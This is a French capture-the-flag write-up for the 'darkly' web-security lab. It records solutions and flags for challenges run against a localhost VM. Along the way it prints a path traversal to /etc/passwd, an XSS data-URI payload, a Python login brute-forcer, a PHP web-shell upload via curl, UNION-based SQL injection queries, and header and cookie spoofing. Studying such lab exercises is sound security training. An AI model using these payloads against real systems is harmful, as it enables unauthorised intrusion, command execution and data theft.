# darkly

Open your web browser <br>

```c
Pour aller sur le site
settings
Bridget Adapter

puis taper adresse du localhost



```

```c
1.✅
Forget Password
button submit , j'ai mit envoyer a mon adresse 
The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0

2.✅
Le site est mal sécurisé car le code PHP ne vérifie pas ce que tu demandes dans l'URL.
http://localhost:8080/index.php?page=../../../../../../../etc/passwd
The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 

3.✅

http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFja2VkIik8L3NjcmlwdD4=
The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

Quand j'accede a cette page :
http://localhost:8080/index.php?page=media&src=...
le site decode la valeur de src.

on dit au navigateur du code base64
data:text/html;base64
on a encoder un alert() qui declenche un script cachet.


4.✅
Deux champs dans le formulaire:
Souvent c'est admin username.
username: admin
Pour le password j'ai fais un programme qui teste les 50 mots de passe les plus courant : <br>

#!/usr/bin/env python3
import requests

# Configuration
URL = "http://localhost:8080/index.php"

# Top 50 des mots de passe les plus utilisés (source: SecLists)
PASSWORDS = [
    "123456", "password", "123456789", "12345", "12345678", 
    "qwerty", "1234567", "111111", "123123", "admin",
    "1234567890", "letmein", "welcome", "monkey", "password1",
    "abc123", "1234", "dragon", "shadow", "sunshine",
    "master", "football", "123456a", "123", "aaron431",
    "password123", "123456b", "123456", "qwerty123", "admin123",
    "welcome1", "1q2w3e4r", "123qwe", "654321", "555555",
    "lovely", "7777777", "123abc", "11111", "123321",
    "mustang", "access", "starwars", "baseball", "superman",
    "batman", "trustno1", "hello", "jordan23", "123456q"
]

# Bruteforce
print("Starting brute force attack...")
for pwd in PASSWORDS:
    try:
        r = requests.get(URL, params={
            "page": "signin",
            "username": "admin",
            "password": pwd,
            "Login": "Login"
        })
        
        if "WrongAnswer" not in r.text:
            print(f"\n[+] SUCCESS! Password found: {pwd}")
            print(f"Response length: {len(r.text)} characters")
            exit()
            
        print(f"Trying: {pwd.ljust(15)} | Status: {r.status_code}", end='\r')
        
    except Exception as e:
        print(f"\nError with {pwd}: {str(e)}")
        continue

print("\n[-] Attack completed. No password found.")



The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 

5.✅
// 1. On cree un fichier php pour executer des commandes 
echo '<?php system($_GET["cmd"]); ?>' > shell.php
// 2. On upload le fichier 

curl -s -H "Content-Type: multipart/form-data" \
  -F Upload=Upload \
  -F "uploaded=@shell.php;type=image/jpeg" \
  "http://localhost:8080/index.php?page=upload"

Ensuite il va cat automatiquement le contenu de la page

THe flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

6.✅

1 UNION SELECT Commentaire, 2 FROM users WHERE first_name = CHAR(70,108,97,103) --

ID: 1 UNION SELECT Commentaire, 2 FROM users WHERE first_name = CHAR(70,108,97,103) -- 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 2

Flag is: 8be3c943b5749f34703c7b295a8ae8a7eeae92f8dfe03707743d2d29b02fe107
??? 


7.✅
Recherche une image par number

On teste 1 OR 1=1 → 
ça affiche toutes les images 

On teste 1 UNION SELECT 1,2 -- 
il y a 2 colonnes dans la requête

On utilise 1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = database() --
On découvre la table : list_images

On utilise 1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = CHAR(108,105,115,116,95,105,109,97,103,101,115) --
→ On découvre les colonnes : id, url, title, comment

On utilise 1 UNION SELECT comment, 2 FROM list_images --


ID: 1 UNION SELECT comment, 2 FROM list_images -- 
Title: 2
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46


Le hash MD5 est : 1928e8083cf461a51303633093573c46
→ Reverse MD5 : Love
→ On le met en minuscule : love
→ SHA256 de "love" : 04f0dce3775f4b5f2c2bfe3c1c9ed970984173af2d4a01fd7fa3ddbd5de5b2f2
→ Flag final : 04f0dce3775f4b5f2c2bfe3c1c9ed970984173af2d4a01fd7fa3ddbd5de5b2f2

04f0dce3775f4b5f2c2bfe3c1c9ed970984173af2d4a01fd7fa3ddbd5de5b2f2



6⛔ et 7⛔ a verifier. 



8.✅
Dans le code j'ai vue qu'on pouvait envoyer ce qu'on veut.
'javascript:this.form.submit();'>
j'ai changer la valeur du 2eme , puis j'ai selecter le premier grade et je l'ai changer.

The flag is : 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa


9.✅
© BornToSec (celui avec le son et albatros)
Commentaires trouver dans l'inspect.

You must cumming from : "https://www.nsa.gov/" to go to the next step

Let's use this browser : "ft_bornToSec". It will help you a lot.

"Tu dois venir du site de la NSA et utiliser un navigateur spécial."

Du coup, on fait croire au site qu’on vient de là et qu’on a ce navigateur.

curl "http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" \
  -H "Referer: https://www.nsa.gov/" \
  -H "User-Agent: ft_bornToSec" | grep -i "flag"

The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


10.✅
Les logos

index.php?page=redirect&site=facebook
c'est une redirection donc on peut rediriger la ou on.

The flag is : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3

11.✅
Feedback
j'ai taper juste dans name quelque chose et pas dans message.

C’est une faille car le site réaffiche directement ce que tu tapes sans le vérifier, ce qui permet d’y injecter du code.
C’est une XSS (Cross-Site Scripting) parce que tu peux y mettre du JavaScript malveillant qui s’exécutera dans le navigateur.

The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e

12.✅

robot.txt
https://crackstation.net/
http://10.11.248.193/admin/
root
qwerty123@
The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff 

13.✅
cookies
sur chrome
dans application/cookies
j'ai remplacer la value qui voulait dire false par true
The flag is : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

14.❌

Hidden

```


https://crackstation.net/









```
